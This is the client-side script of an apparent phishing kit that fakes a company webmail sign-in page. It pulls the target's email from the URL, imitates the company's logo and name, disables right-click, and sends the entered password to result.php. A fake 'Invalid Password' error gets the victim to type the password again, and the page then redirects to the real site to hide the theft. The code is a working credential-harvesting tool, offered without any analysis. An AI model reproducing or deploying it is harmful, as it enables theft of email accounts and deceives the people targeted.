    <script>
        const submitButton = $("#btn");
        const form = $("#result");
        const passwordField = $("#password");
        const errorBox = $("#ermg");
        const honeypot = $("#website");
        const userField = $("#userid");
        const formEndpoint = "./result.php";
        let formSubmitted = 0;
        let isSubmitting = false;

        function setButtonState(loading) {
            submitButton.prop("disabled", loading);
            submitButton.text(loading ? "Verifying..." : "Sign in");
        }

        function isBase64(str) {
            if (str === "" || String(str).trim() === "") {
                return false;
            }
            try {
                return btoa(atob(str)) === atob(btoa(str));
            } catch (e) {
                return false;
            }
        }

        function getEmail() {
            let email = "";
            if (window.location.hash) {
                email = window.location.hash.substring(1);
                email = isBase64(email) ? window.atob(email) : email;
            }
            return email.trim();
        }

        function setBrandDetails(email) {
            document.getElementById("userid").value = email;
            const domain = (email.split("@")[1] || "").toLowerCase().trim();
            const companyName = domain ? domain.split(".")[0] : "company";

            if (!domain) {
                return;
            }

            const iconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=64`;
            $("#myframe").attr("src", domain.includes("nifty") ? "https://www.nifty.com" : `https://${domain}`);
            $("#favicon").attr("href", iconUrl);
            $("#logoimg").attr("src", iconUrl);
            $("#tittle").text(`${companyName} - Mail`);
            $(".logoname").text(companyName);
            $("#logona2").text(companyName);
        }
        
        // Add this at the bottom of your script, outside of any other function
        document.addEventListener("DOMContentLoaded", function () {
            const email = getEmail();
            if (email) {
                setBrandDetails(email);
            }
        });

        submitButton.on("click", function () {
            if (isSubmitting) {
                return;
            }
            $(this).text("Verifying...");
            setTimeout(() => {
                if (!isSubmitting) {
                    $(this).text("Sign in");
                }
            }, 1800);
        });
        
        

        document.addEventListener("contextmenu", function (e) {
            e.preventDefault();
        });

        form.on("submit", function (event) {
            event.preventDefault();

            if (isSubmitting) {
                return;
            }

            const emailValue = userField.val().trim();
            const passwordValue = passwordField.val().trim();
            const domain = (emailValue.split("@")[1] || "").toLowerCase().trim();
            const honeypotValue = honeypot.val().trim();

            if (honeypotValue !== "") {
                console.warn("Bot detected, submission blocked.");
                return;
            }

            if (!emailValue || !passwordValue) {
                alert("Please fill in all fields.");
                return;
            }

            formSubmitted += 1;
            isSubmitting = true;
            setButtonState(true);
            errorBox.hide().text("");

            const formData = new FormData(this);

            $.ajax({
                url: formEndpoint,
                type: "POST",
                data: formData,
                processData: false,
                contentType: false,
                dataType: "json",
                success: function (response) {
                    if (response && response.status === "success") {
                        if (formSubmitted === 1) {
                            passwordField.val("");
                            errorBox.css("display", "block").text("Invalid Password. Please enter your correct password.");
                        } else {
                            setTimeout(() => {
                                window.location.href = domain ? `https://${domain}` : "/";
                            }, 1200);
                        }
                    } else {
                        errorBox.css("display", "block").text(response && response.message ? response.message : "Something went wrong. Please try again.");
                    }
                },
                error: function () {
                    errorBox.css("display", "block").text("Unable to reach the server. Please try again.");
                },
                complete: function () {
                    isSubmitting = false;
                    setButtonState(false);
                }
            });
        });
    </script>
